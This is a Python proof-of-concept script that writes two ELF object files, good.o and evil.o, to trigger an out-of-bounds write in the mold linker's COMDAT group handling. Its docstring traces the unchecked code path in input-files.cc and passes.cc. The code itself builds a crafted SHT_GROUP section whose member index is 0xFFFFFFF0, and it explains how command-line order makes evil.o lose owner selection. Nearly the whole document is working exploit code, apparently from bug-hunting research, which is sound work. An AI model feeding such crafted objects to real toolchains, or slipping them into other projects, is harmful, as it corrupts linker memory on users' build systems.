#!/usr/bin/env python3
"""Writes two minimal x86_64 ET_REL ELF object files, good.o and evil.o, that share a single
GLOBAL function symbol "foo" as a COMDAT-group signature.

src/input-files.cc, ObjectFile<E>::parse_sections():

    if (!keep_discarded_comdat && !comdat_groups.empty()) {
      comdat_discarded.resize(sections.size());
      for (ComdatGroupRef<E> &ref : comdat_groups)
        if (!ref.is_owner)
          for (u32 i : ref.members(*this))
            comdat_discarded[i] = true;    // <-- i is an unvalidated raw file u32, no bounds check
    }

`ref.members(*this)` (src/mold.h, ComdatGroupRef<E>::members()) returns the raw u32 payload of
this object's own SHT_GROUP section (skipping the first "flags" word) completely unvalidated
against `sections.size()`/`elf_sections.size()`. `comdat_discarded` is a `std::vector<bool>`,
whose `operator[]` performs no bounds check at all - writing to a huge index computes a wild
pointer far outside the vector's small backing allocation and stores a bit there: a genuine
out-of-bounds *write*, not just a read.

The same unvalidated indices are read again in src/passes.cc's parse_input_sections():
    for (u32 i : ref.members(*file))
      if (InputSection<E> *isec = file->sections[i])   // <-- also unchecked
        isec->is_alive = ref.is_owner;

To reach the buggy `!ref.is_owner` branch, the malicious object's COMDAT group must *lose* the
group-selection race against another object sharing the same signature symbol name - mold's
COMDAT owner selection picks the file with the smallest `file->priority` (assigned in
command-line order, so the first file listed wins). This script therefore emits:

  - good.o: defines global function symbol "foo", section .text, and a well-formed SHT_GROUP
    whose one member entry is a valid, in-range section index (.text's own index).
  - evil.o: also defines global function symbol "foo" (same name -> same interned Symbol* once
    mold resolves it), and a well-formed (correctly-in-bounds, non-empty) SHT_GROUP section
    whose one member entry is 0xFFFFFFF0 - a huge, out-of-range section index.

Listing good.o first on the command line makes it the COMDAT owner (is_owner=true); evil.o's
group then loses (is_owner=false), taking the vulnerable comdat_discarded[i]=true path with
i=0xFFFFFFF0.
"""
import struct
import sys

SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_GROUP = 17

GRP_COMDAT = 1
STB_GLOBAL = 1
STT_FUNC = 2

MALICIOUS_MEMBER_IDX = 0xFFFFFFF0  # far past evil.o's ~6 real sections; large enough to jump
                                    # multiple GB past the tiny comdat_discarded vector<bool>
                                    # backing allocation, into genuinely unmapped memory (see
                                    # candidate 010's mmap/heap-index lesson in projects/mold.md)


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def sym(name, info, other, shndx, value, size):
    return struct.pack("<IBBHQQ", name, info, other, shndx, value, size)


def build(malicious: bool) -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_text = addname(".text")
    n_group = addname(".group")
    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    text_data = b"\x90\x90\x90\x90"  # 4 NOPs

    strtab_data = b"\x00"
    n_foo = len(strtab_data)
    strtab_data += b"foo\x00"

    sym_null = sym(0, 0, 0, 0, 0, 0)
    # global function symbol "foo", defined in .text (section index 1)
    sym_foo = sym(n_foo, (STB_GLOBAL << 4) | STT_FUNC, 0, 1, 0, len(text_data))

    symtab_data = sym_null + sym_foo

    # SHT_GROUP body: word0 = flags, word1.. = member section indices
    member_idx = MALICIOUS_MEMBER_IDX if malicious else 1  # 1 == .text's own section index
    group_data = struct.pack("<II", GRP_COMDAT, member_idx)

    # Section layout:
    # 0 NULL, 1 .text, 2 .group, 3 .symtab, 4 .strtab, 5 .shstrtab
    off = EHDR_SIZE
    off_text = off
    off += len(text_data)
    off_group = off
    off += len(group_data)
    off_symtab = off
    off += len(symtab_data)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_text = shdr(n_text, SHT_PROGBITS, 2 | 4, 0, off_text, len(text_data), 0, 0, 1, 0)
    # .group: sh_link = symtab index (3), sh_info = signature symbol index (1, "foo")
    sh_group = shdr(n_group, SHT_GROUP, 0, 0, off_group, len(group_data), 3, 1, 4, 4)
    # .symtab: sh_link = strtab index (4), sh_info = index of first global symbol (1)
    sh_symtab = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(symtab_data), 4, 1, 8, 24)
    sh_strtab = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        6,          # e_shnum
        5,          # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + text_data + group_data + symtab_data + strtab_data + names + b"\x00" * pad +
            sh_null + sh_text + sh_group + sh_symtab + sh_strtab + sh_shstrtab)


def main() -> None:
    good_path = sys.argv[1] if len(sys.argv) > 1 else "good.o"
    evil_path = sys.argv[2] if len(sys.argv) > 2 else "evil.o"
    with open(good_path, "wb") as f:
        f.write(build(malicious=False))
    with open(evil_path, "wb") as f:
        f.write(build(malicious=True))
    print(f"wrote {good_path}, {evil_path}")


if __name__ == "__main__":
    main()
